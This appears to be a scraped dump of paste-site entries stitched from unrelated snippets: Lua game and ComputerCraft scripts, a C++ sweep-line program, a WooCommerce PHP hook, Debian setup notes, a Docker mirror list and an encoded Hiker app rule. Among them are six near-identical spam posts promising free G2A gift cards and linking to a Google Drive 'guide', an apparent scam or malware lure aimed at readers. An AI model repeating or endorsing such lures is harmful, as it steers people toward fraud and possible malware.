                ec = textutils.unserialize(estratto)
                term.setCursorPos(1, 3)
                print(""Entrate:"")
                colore(colors.lime)
                print(ec.entrata1)
                print(ec.entrata2)
                print(ec.entrata3)
                print(ec.entrata4)
                colore(colors.black)
                print(""\nUscite:"")
                colore(colors.red)
                print(ec.uscita1)
                print(ec.uscita2)
                print(ec.uscita3)
                print(ec.uscita4)
                term.setCursorPos(1, 18)
                sfondo(colors.white)
                colore(colors.black)
                term.write("" Torna al men√•B9 principale "")
                while true do
                    event, key, x, y = os.pullEventRaw()
                    if event == ""mouse_click"" and x <= 26 and y == 18 then
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 15 and x <= 24 then --Pulsante disconnetti da nPay
                disconnetti()

            elseif event == ""timer"" and key == antitonto then --Butta fuori l'utente se non fa niente
                disconnetti()

            elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (pannello utente)
                update()
            end
        end

    elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (schermata principale)
        update()
    end
end"
ZMZfdZua,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 12:56:25 PM CDT,"#include <iostream>
#include <map>
using namespace std;

int main()
{
  map<int, int> mapa;
  int n;
  cin >> n;

  int x[n][2];
  for(int i = 0; i < n; i++) {
    cin >> x[i][0] >> x[i][1];

    mapa[x[i][0]]++;
    mapa[x[i][1] + 1]--;
  }
    int maksimum = 0, ans = 0;
  for(auto it = mapa.begin(); it != mapa.end(); it++) {
    ans += it->second;
    maksimum = max(maksimum, ans);
  }
  cout << maksimum << endl;




    return 0;
}
"
yFdBBDhS,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,kjihu25,JavaScript,Sunday 2nd of June 2024 12:52:59 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
Ebb1bZjL,Untitled,MAGMI,Lua,Sunday 2nd of June 2024 12:39:41 PM CDT,"i = 0
while True do
	if turtle.getFuelLevel() < 200 then
		print(""Refuelling"")
		turtle.refuel()
	end

	turtle.dig()
	turtle.forward()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.digUp()
	turtle.up()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.down()
	turtle.digDown()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.up()
	i = i+1
	if i == 50 then
		for var=0,50 do
			turtle.back()
		end
	end
end"
kuUuADCB,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,buch,JavaScript,Sunday 2nd of June 2024 12:02:54 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
zWQXeEaB,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,Alfonso1119,JavaScript,Sunday 2nd of June 2024 11:37:52 AM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
r3Rt445J,idk,qsenko1,Lua,Sunday 2nd of June 2024 11:30:11 AM CDT,"local Connection 

while task.wait(.5) do
    if ParticlesButton:GetAttribute(""hidden"") == false then
    --warn(""do the opposite"")	
	else   
       for _,Player in pairs(game:GetService(""Players""):GetPlayers()) do
			--warn(Player.Name)
			if Player.Name ~= game.Players.LocalPlayer.Name then		
				if Player.Character:FindFirstChild(""Right Arm"") and Player.Character:FindFirstChild(""Left Arm"") then
					if Player.Character:FindFirstChild(""Humanoid"") then
						if Player.Character:FindFirstChild(""Humanoid"").Health > 0 then
						--	Player.Character:FindFirstChild(""Humanoid"").Health = Player.Character:FindFirstChild(""Humanoid"").Health - 1
							if game.Workspace:FindFirstChild(Player.Name) then
								if game.Workspace:FindFirstChild(Player.Name)[""Right Arm""]:FindFirstChild(""Attachment1"") and game.Workspace:FindFirstChild(Player.Name)[""Left Arm""]:FindFirstChild(""Attachment1"") then
									warn(Player)
									if game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") and game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") then
										game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
										game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
										warn(""found"")
									else
										warn(""cant find trail"")
									end
								end
							end
						end
					end
				end	
   Connection = Player.CharacterAdded:Once(function(Char)
					warn(Char)
					warn(""other player restets"")
					task.wait(5)
					if Char:WaitForChild(""Right Arm"") and Char:WaitForChild(""Left Arm"") then
						warn(""Executed1"")
								if Char:FindFirstChild(""Right Arm"") and Char:FindFirstChild(""Left Arm"") then
							    warn(""Executed2"")
if Char[""Right Arm""]:FindFirstChild(""Attachment1"") and Char[""Left Arm""]:FindFirstChild(""Attachment1"") then
warn(""Executed3"")
if Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") and Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") then
					warn(""Executed4"")
					Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
					Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
								end
							end
						end
					end
				end)	
			end
		end 
   end
end"
1Y8HMYEu,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,Garoam,JavaScript,Sunday 2nd of June 2024 11:12:50 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
H8u09vRN,wcfm-vendor-age-from-custom-field-dob,palsushobhan,PHP,Sunday 2nd of June 2024 10:58:05 AM CDT,"add_action('wcfmmp_store_list_after_store_info', function($store_id) {
    $wcfmmp_addition_info_fields = wcfm_get_option( 'wcfmvm_registration_custom_fields', array() );
    if( empty( $wcfmmp_addition_info_fields ) ) return;
    $has_addition_field = false;
    if( !empty( $wcfmmp_addition_info_fields ) ) {
        foreach( $wcfmmp_addition_info_fields as $wcfmvm_registration_custom_field ) {
            if( !isset( $wcfmvm_registration_custom_field['enable'] ) ) continue;
            if( !$wcfmvm_registration_custom_field['label'] ) continue;
            $has_addition_field = true;
            break;
        }
    }
    if( !$has_addition_field ) return;
    $wcfmvm_custom_infos = (array) get_user_meta( $store_id, 'wcfmvm_custom_infos', true );
    if( !empty( $wcfmmp_addition_info_fields ) ) {
        $label = 'DOB';
        $name = sanitize_title( $label );
        $field = $wcfmvm_custom_infos[$name] ?? '';
        if($field) {
            $age = DateTime::createFromFormat('d/m/Y', $field);
            $currentDate = new DateTime();
            echo '<p class=""store-phone""><i class=""wcfmfa fa-birthday-cake"" aria-hidden=""true""></i> Age: ' . $currentDate->diff($age)->y . ' years</p>';
        }
    }
});"
uCvdj8Yn,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,atakan1983,JavaScript,Sunday 2nd of June 2024 10:47:46 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
gM0YthTj,Disable IPv6 Debian,kiedtink,Bash,Sunday 2nd of June 2024 10:31:43 AM CDT,"nano /etc/sysctl.conf
 
Add the following at the bottom of the file:

net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
net.ipv6.conf.tun0.disable_ipv6 = 1"
fZZJQTuD,AdGuard Home Debian,kiedtink,Bash,Sunday 2nd of June 2024 10:28:50 AM CDT,"apt install curl acl
curl -LO https://github.com/AdguardTeam/AdGuardHome/releases/latest/download/AdGuardHome_linux_amd64.tar.gz
tar -vxf AdGuardHome_linux_amd64.tar.gz
mkdir /opt/AdGuardHome
mv ~/AdGuardHome/AdGuardHome /opt/AdGuardHome/
chown -R root:root /opt/AdGuardHome
chmod -R o-rwx /opt/AdGuardHome
setfacl -d -m o::--- /opt/AdGuardHome
/opt/AdGuardHome/AdGuardHome -s install
"
bUkH0hEJ,–¥–æ–∫–µ—Ä —Ö–∞–± xye—Å–æ—Å—ã,WheatleyHDD,JSON,Sunday 2nd of June 2024 10:24:12 AM CDT,"{
	""registry-mirrors"" : [
		""https://mirror.gcr.io"",
        ""https://dockerhub.timeweb.cloud"",
        ""https://dockerhub1.beget.com"",
        ""https://c.163.com"",
        ""https://registry.docker-cn.com"",
        ""https://daocloud.io"",
        ""https://cr.yandex/mirror"",
        ""https://noohub.ru"",
        ""https://quay.io"",
        ""https://registry.access.redhat.com"",
        ""https://registry.redhat.io"",
        ""https://public.ecr.aws""
	]
}"
ugF49V7F,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,lookos13,JavaScript,Sunday 2nd of June 2024 10:22:45 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
t0bkwywm,ÈÇÄÊÇ®‰∏ÄËµ∑ÁúãÔºöËß£ÊûêÁÆ°ÁêÜ,xiaomianao666,JavaScript,Sunday 2nd of June 2024 10:10:18 AM CDT,Êµ∑ÈòîËßÜÁïåËßÑÂàôÂàÜ‰∫´ÔºåÂΩìÂâçÂàÜ‰∫´ÁöÑÊòØÔºö‰∫åÁ∫ßÈ°µÈù¢ËØ¶ÊÉÖÔø•page_detailÔø•Ëß£ÊûêÁÆ°ÁêÜ@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcImRycHlcIixcInBhdGhcIjpcImRycHlcIixcInJ1bGVcIjpcImZ1bmN0aW9uIGluaXRIaWtlcigpIHtcXG4gICAgY29uc3QgaXNDbG9zZUxvZyA9ICFnZXRJdGVtKFxcXCJ1c2VMb2dcXFwiLCBcXFwiXFxcIik7XFxuICAgIGNvbnN0IGxvY2FsS2V5ID0gXFxcImRycHlcXFwiO1xcbiAgICBjb25zdCBDcnlwdG9VdGlsID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL2Fzc2V0cy9jcnlwdG8tamF2YS5qc1xcXCIpO1xcbiAgICBnbG9iYWxUaGlzLmxvY2FsID0ge1xcbiAgICAgICAgc2V0KHJ1bGVrZXksIGssIHYpIHtcXG4gICAgICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKGxvY2FsS2V5ICsgXFxcIkBcXFwiICsgcnVsZWtleSArIFxcXCJAXFxcIiArIGssIHYpO1xcbiAgICAgICAgfSxcXG4gICAgICAgIGdldChydWxla2V5LCBrLCB2KSB7XFxuICAgICAgICAgICAgcmV0dXJuIHN0b3JhZ2UwLmdldEl0ZW0obG9jYWxLZXkgKyBcXFwiQFxcXCIgKyBydWxla2V5ICsgXFxcIkBcXFwiICsgaywgXFxcIlxcXCIpIHx8IHY7XFxuICAgICAgICB9LFxcbiAgICAgICAgZGVsZXRlKHJ1bGVrZXksIGspIHtcXG4gICAgICAgICAgICBzdG9yYWdlMC5jbGVhckl0ZW0obG9jYWxLZXkgKyBcXFwiQFxcXCIgKyBydWxla2V5ICsgXFxcIkBcXFwiICsgayk7XFxuICAgICAgICB9XFxuICAgIH07XFxuICAgIGV2YWwoZ2V0Q3J5cHRvSlMoKSk7XFxuICAgIGdsb2JhbFRoaXMuQ3J5cHRvSlMgPSBDcnlwdG9KUztcXG5cXG4gICAgbGV0ICRyZXF1ZXN0ID0gcmVxdWVzdDtcXG4gICAgbGV0ICRwb3N0ID0gcG9zdDtcXG4gICAgZ2xvYmFsVGhpcy5yZXEgPSBmdW5jdGlvbiAodXJsLCBjb2JqKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGxldCByZXMgPSB7fTtcXG4gICAgICAgICAgICBsZXQgb2JqID0gT2JqZWN0LmFzc2lnbih7fSwgY29iaik7XFxuICAgICAgICAgICAgaWYgKG9iai5kYXRhKSB7XFxuICAgICAgICAgICAgICAgIG9iai5ib2R5ID0gb2JqLmRhdGE7XFxuICAgICAgICAgICAgICAgIGRlbGV0ZSBvYmouZGF0YTtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgaWYgKG9iai5oYXNPd25Qcm9wZXJ0eShcXFwicmVkaXJlY3RcXFwiKSkgb2JqLnJlZGlyZWN0ID0gISFvYmoucmVkaXJlY3Q7XFxuICAgICAgICAgICAgaWYgKG9iai5idWZmZXIgPT09IDIpIHtcXG4gICAgICAgICAgICAgICAgb2JqLnRvSGV4ID0gdHJ1ZTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgb2JqLmhlYWRlcnMgPSBPYmplY3QuYXNzaWduKHtcXG4gICAgICAgICAgICAgICAgQ29va2llOiBcXFwiI25vQ29va2llI1xcXCJcXG4gICAgICAgICAgICB9LCBvYmouaGVhZGVycyk7XFxuICAgICAgICAgICAgaWYgKHVybCA9PT0gXFxcImh0dHBzOi8vYXBpLm5uLmNpL29jci9iNjQvdGV4dFxcXCIgJiYgb2JqLmhlYWRlcnMpIHtcXG4gICAgICAgICAgICAgICAgb2JqLmhlYWRlcnNbXFxcIkNvbnRlbnQtVHlwZVxcXCJdID0gXFxcInRleHQvcGxhaW5cXFwiO1xcbiAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICBpZiAodXJsLnN0YXJ0c1dpdGgoXFxcImZpbGU6Ly9cXFwiKSAmJiAodXJsLmluY2x1ZGVzKFxcXCI/dHlwZT1cXFwiKSB8fCB1cmwuaW5jbHVkZXMoXFxcIj9wYXJhbXM9XFxcIikpKSB7XFxuICAgICAgICAgICAgICAgIHVybCA9IHVybC5zbGljZSgwLCB1cmwubGFzdEluZGV4T2YoXFxcIj9cXFwiKSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGZvciAobGV0IGtleSBpbiBvYmouaGVhZGVycykge1xcbiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIG9iai5oZWFkZXJzW2tleV0gIT09IFxcXCJzdHJpbmdcXFwiKSB7XFxuICAgICAgICAgICAgICAgICAgICBvYmouaGVhZGVyc1trZXldID0gU3RyaW5nKG9iai5oZWFkZXJzW2tleV0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCByID0gXFxcIlxcXCI7XFxuICAgICAgICAgICAgLyogaWYgKFN0cmluZyhvYmoubWV0aG9kKS50b0xvd2VyQ2FzZSgpID09PSBcXFwicG9zdFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgIHIgPSAkcG9zdCh1cmwsIG9iaik7XFxuICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICByID0gJHJlcXVlc3QodXJsLCBvYmopO1xcbiAgICAgICAgICAgICB9Ki9cXG4gICAgICAgICAgICByID0gJHJlcXVlc3QodXJsLCBvYmopO1xcbiAgICAgICAgICAgIGlmIChvYmoud2l0aEhlYWRlcnMpIHtcXG4gICAgICAgICAgICAgICAgciA9IEpTT04ucGFyc2Uocik7XFxuICAgICAgICAgICAgICAgIHJlcy5jb250ZW50ID0gci5ib2R5O1xcbiAgICAgICAgICAgICAgICByZXMuaGVhZGVycyA9IHt9O1xcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBbaywgdl0gb2YgT2JqZWN0LmVudHJpZXMoci5oZWFkZXJzIHx8IHt9KSkge1xcbiAgICAgICAgICAgICAgICAgICAgcmVzLmhlYWRlcnNba10gPSB2WzBdO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgcmVzLmNvbnRlbnQgPSByO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAob2JqLmJ1ZmZlciA9PT0gMikge1xcbiAgICAgICAgICAgICAgICByZXMuY29udGVudCA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZUhleChyZXMuY29udGVudCkudG9CYXNlNjQoX2Jhc2U2NC5OT19XUkFQKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIHJlcztcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coXFxcIkVycm9yXFxcIiArIGUudG9TdHJpbmcoKSk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgLypcXG4gICAgY29uc3QgSmluSmEgPSAkLnJlcXVpcmUoXFxcImh0dHBzOi8vY2RuLmJvb3RjZG4ubmV0L2FqYXgvbGlicy9tdXN0YWNoZS5qcy80LjEuMC9tdXN0YWNoZS5qc1xcXCIpO1xcbiAgXFxuICAgIGNvbnN0IEpQID0gJC5yZXF1aXJlKFxcXCJodHRwczovL2pzb25wYXRoLXBsdXMuZ2l0aHViLmlvL0pTT05QYXRoL2Rpc3QvaW5kZXgtYnJvd3Nlci11bWQuY2pzXFxcIik7XFxuICAgIGdsb2JhbFRoaXMuY2hlZXJpbyA9IHtcXG4gICAgICAgIGppbmphMih0ZW1wbGF0ZSwgb2JqKSB7XFxuICAgICAgICAgICAgXFxuICAgICAgICAgICAgcmV0dXJuICQubG9nKEppbkphLnJlbmRlcih0ZW1wbGF0ZSwgb2JqKSk7XFxuICAgICAgICB9LFxcbiAgICAgICAganAocGF0aCwganNvbikge1xcbiAgICAgICAgICAgIHJldHVybiBKUC5KU09OUGF0aCh7XFxuICAgICAgICAgICAgICAgIHBhdGgsXFxuICAgICAgICAgICAgICAgIGpzb25cXG4gICAgICAgICAgICB9KVswXTtcXG4gICAgICAgIH1cXG4gICAgfSovXFxuICAgIGdsb2JhbFRoaXMucGRmYSA9IF9wZGZhO1xcbiAgICBnbG9iYWxUaGlzLnBkID0gX3BkO1xcbiAgICBnbG9iYWxUaGlzLnBkZmggPSBfcGRmaDtcXG4gICAgU3RyaW5nLnByb3RvdHlwZS5yZXBsYWNlQWxsID0gZnVuY3Rpb24gKHNlYXJjaCwgcmVwbGFjZW1lbnQpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLnNwbGl0KHNlYXJjaCkuam9pbihyZXBsYWNlbWVudCk7XFxuICAgIH07XFxuICAgIGxldCAkdG9TdHJpbmcgPSBGdW5jdGlvbi5wcm90b3R5cGUudG9TdHJpbmc7XFxuICAgIEZ1bmN0aW9uLnByb3RvdHlwZS50b1N0cmluZyA9IGZ1bmN0aW9uICgpIHtcXG4gICAgICAgIHJldHVybiAkdG9TdHJpbmcuYXBwbHkodGhpcykudHJpbSgpO1xcbiAgICB9O1xcbiAgICBpZiAoaXNDbG9zZUxvZykge1xcbiAgICAgICAgLy8g6YeN5YaZY29uc29sZS5sb2flh73mlbBcXG4gICAgICAgIGNvbnNvbGUubG9nID0gZnVuY3Rpb24gKCkge1xcbiAgICAgICAgICAgIC8vIOajgOafpeS8oOWFpeWPguaVsOeahOaVsOmHj1xcbiAgICAgICAgICAgIGlmIChhcmd1bWVudHMubGVuZ3RoID4gMSkge1xcbiAgICAgICAgICAgICAgICAvLyDlpoLmnpzlj4LmlbDmlbDph4/lpKfkuo4x77yM6LCD55So5Y6f5aeL55qEY29uc29sZS5sb2flh73mlbBcXG4gICAgICAgICAgICAgICAgLy9vcmlnaW5hbExvZy5hcHBseShjb25zb2xlLCBhcmd1bWVudHMpO1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHJldHVybjtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgLy8g5aaC5p6c5Y+C5pWw5Y+q5pyJ5LiA5Liq77yM5YiZ5LiN5YGa5Lu75L2V5pON5L2cXFxuICAgICAgICB9O1xcbiAgICB9XFxufVxcbmluaXRIaWtlcigpO1xcbmNvbnN0IGRycHlQYXRoID0gZ2V0UGF0aChcXFwiaGlrZXI6Ly9maWxlcy9kYXRhL1xcXCIgKyBNWV9SVUxFLnRpdGxlICsgXFxcIi9saWJzX2hpa2VyL2RycHkyLmpzXFxcIik7XFxuXFxuaWYgKCFmaWxlRXhpc3QoZHJweVBhdGgpKSB7XFxuICAgIHRocm93IG5ldyBFcnJvcihcXFwi57y65bCRZHJweS5qc+i/kOihjOW6k1xcXCIpO1xcbn1cXG5sZXQgZHJweSA9ICQucmVxdWlyZShkcnB5UGF0aCk7XFxuLypcXG5sZXQgY3VycmVudFBhdGggPSBcXFwiXFxcIjtcXG5sZXQgJGluaXQgPSBkcnB5LmluaXQ7XFxuZHJweS5pbml0ID0gZnVuY3Rpb24oZXh0KSB7XFxuICAgIGlmIChleHQgPT09IGN1cnJlbnRQYXRoKSByZXR1cm47XFxuICAgICRpbml0LmNhbGwodGhpcywgZXh0KTtcXG4gICAgY3VycmVudFBhdGggPSBleHQ7XFxufSovXFxuJC5leHBvcnRzID0gZHJweTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzFfdmVydGljYWxfcGljX2JsdXJcIixcIm5hbWVcIjpcIuivpue7humhtemdolwiLFwicGF0aFwiOlwiZGV0YWlsZWRcIixcInJ1bGVcIjpcImpzOlxcbihmdW5jdGlvbiAoKSB7XFxuICBsZXQgaWQgPSBNWV9QQVJBTVMudm9kSWQ7XFxuICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICgpID0+IHtcXG4gICAgR00uY2xlYXIoXFxcInJlbm92YXRlTGlzdFxcXCIpO1xcbiAgICBjbGVhck15VmFyKFxcXCJzb3J0aVxcXCIpO1xcbiAgICBjbGVhck15VmFyKFxcXCJwYWdlbnVtXFxcIik7XFxuICB9KTtcXG4gIGFkZExpc3RlbmVyKCdvblJlZnJlc2gnLCAkLnRvU3RyaW5nKChpZCkgPT4ge1xcbiAgICAvL2NsZWFyTXlWYXIoaWQgKyBcXFwiZXJpbmZvXFxcIilcXG4gIH0sIGlkKSlcXG5cXG4gIC8v5pa55rOVXFxuICBmdW5jdGlvbiBmb250c3R5bGUodGV4dCwgcGFyYW1zKSB7XFxuICAgIHBhcmFtcyA9IHBhcmFtcyB8fCB1bmRlZmluZWQ7XFxuICAgIHZhciBoID0gcGFyYW1zLmggIT09IGZhbHNlID8gJ+KAnOKAnOKAneKAnScgOiAnJztcXG4gICAgdmFyIHRhZ3MgPSBwYXJhbXMudGFncyB8fCBcXFwiXFxcIjtcXG4gICAgaWYgKHBhcmFtcy5jICE9IHVuZGVmaW5lZCkge1xcbiAgICAgIHRleHQgPSB0ZXh0LmZvbnRjb2xvcihwYXJhbXMuYyk7XFxuICAgIH1cXG4gICAgaWYgKHRhZ3MpIHtcXG4gICAgICB2YXIgdGFnQXJyYXkgPSB0YWdzLnNwbGl0KCd8JykuZmlsdGVyKGUgPT4gZSk7XFxuICAgICAgdmFyIG9wZW5UYWdzID0gJyc7XFxuICAgICAgdmFyIGNsb3NlVGFncyA9ICcnO1xcbiAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGFnQXJyYXkubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgIG9wZW5UYWdzICs9ICc8JyArIHRhZ0FycmF5W2ldICsgJz4nO1xcbiAgICAgICAgY2xvc2VUYWdzID0gJzwvJyArIHRhZ0FycmF5W2ldICsgJz4nICsgY2xvc2VUYWdzO1xcbiAgICAgIH1cXG4gICAgICB0ZXh0ID0gb3BlblRhZ3MgKyB0ZXh0ICsgY2xvc2VUYWdzO1xcbiAgICB9XFxuICAgIHJldHVybiBoICsgdGV4dDtcXG4gIH1cXG5cXG4gIGZ1bmN0aW9uIGZpbmRMb25nZXN0RWxlbWVudChhcnIpIHtcXG4gICAgcmV0dXJuIGFyci5yZWR1Y2UoKGEsIGIpID0+IGEubGVuZ3RoID4gYi5sZW5ndGggPyBhIDogYik7XFxuICB9XFxuXFxuICBmdW5jdGlvbiBjb3VudFRvdGFsQnl0ZXModGV4dCkge1xcbiAgICB2YXIgY291bnQgPSAwO1xcbiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHRleHQubGVuZ3RoOyBpKyspIHtcXG4gICAgICB2YXIgY29kZSA9IHRleHQuY2hhckNvZGVBdChpKTtcXG4gICAgICBpZiAoY29kZSA+PSAweDAxMDApIHsgLy8g5Y+M5a2X6IqC5a2X56ym55qEIFVuaWNvZGUg57yW56CB5aSn5LqOIDI1NVxcbiAgICAgICAgY291bnQgKz0gMjsgLy8g5Y+M5a2X6IqC5a2X56ym6K6h5pWw5Li6MlxcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICBjb3VudCArPSAxOyAvLyDljZXlrZfoioLlrZfnrKborqHmlbDkuLoxXFxuICAgICAgfVxcbiAgICB9XFxuICAgIHJldHVybiBjb3VudDtcXG4gIH1cXG5cXG4gIGZ1bmN0aW9uIHN1YnN0cihzdHIsIG1heExlbmd0aCkge1xcbiAgICBsZXQgbGVuID0gMDtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyBpKyspIHtcXG4gICAgICBpZiAoc3RyLmNoYXJDb2RlQXQoaSkgPiAyNTUpIHtcXG4gICAgICAgIGxlbiArPSAyO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICBsZW4rKztcXG4gICAgICB9XFxuICAgICAgaWYgKGxlbiA+IG1heExlbmd0aCkge1xcbiAgICAgICAgcmV0dXJuIHN0ci5zbGljZSgwLCBpKSArICcuLi4nO1xcbiAgICAgIH1cXG4gICAgfVxcbiAgICByZXR1cm4gc3RyO1xcbiAgfVxcblxcbiAgZnVuY3Rpb24gc2V0RGVzYyhkZXNjLCBudW0pIHtcXG4gICAgaWYgKGRlc2MgPT0gdW5kZWZpbmVkKSB7XFxuICAgICAgcmV0dXJuO1xcbiAgICB9XFxuICAgIGRlc2MgPSBkZXNjLmNvbnN0cnVjdG9yID09IEFycmF5ID8gZGVzYy5qb2luKCc8YnI+JykgOiBkZXNjO1xcbiAgICBpZiAoZGVzYy5yZXBsYWNlKC8oPGJyPnxcXFxccyspL2csICcnKS5sZW5ndGggPT0gMCkge1xcbiAgICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogJ2JpZ19ibGFua19ibG9jaydcXG4gICAgICB9KVxcbiAgICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogJ2JpZ19ibGFua19ibG9jaydcXG4gICAgICB9KVxcbiAgICAgIHJldHVybjtcXG4gICAgfVxcblxcbiAgICBjb25zdCBtYXJrID0gJ2Rlc2MnO1xcbiAgICBudW0gPSB0eXBlb2YgKG51bSkgPT0gJ3VuZGVmaW5lZCcgPyAxMDAgOiBudW1cXG4gICAgZGVzYyA9IGRlc2Muc3RhcnRzV2l0aCgn44CA44CAJykgPyBkZXNjIDogJ+OAgOOAgCcgKyBkZXNjO1xcbiAgICBkZXNjID0gZGVzYy5yZXBsYWNlKC8nL2csIFxcXCImIzM5O1xcXCIpO1xcbiAgICBkZXNjID0gZGVzYy5yZXBsYWNlKC9cXFxcclxcXFxuL2csIFxcXCI8YnI+XFxcIik7XFxuICAgIGRlc2MgPSBkZXNjLnJlcGxhY2UoL1xcXFxuL2csIFxcXCI8YnI+XFxcIik7XFxuICAgIGxldCBzZGVzYyA9IHN1YnN0cihkZXNjLCBudW0pO1xcblxcbiAgICB2YXIgY29sb3JzID0ge1xcbiAgICAgIHNob3c6IFxcXCJibGFja1xcXCIsXFxuICAgICAgaGlkZTogXFxcImdyZXlcXFwiXFxuICAgIH1cXG5cXG4gICAgdmFyIGxhenkgPSAkKGAjbm9Mb2FkaW5nI2ApLmxhenlSdWxlKChkYywgc2RjLCBtLCBjcykgPT4ge1xcbiAgICAgIHZhciBzaG93ID0gc3RvcmFnZTAuZ2V0SXRlbShtLCAnMCcpO1xcbiAgICAgIHZhciB0aXRsZSA9IGZpbmRJdGVtKCdkZXNjJykudGl0bGU7XFxuICAgICAgdmFyIHJlID0gLyg8XFxcXC9zbWFsbD48YnI+Lio/PikuKy9nO1xcbiAgICAgIHZhciBleHAgPSAn5bGV5byAOic7XFxuICAgICAgdmFyIHJldCA9ICfmlLbotbc6JztcXG4gICAgICBpZiAoc2hv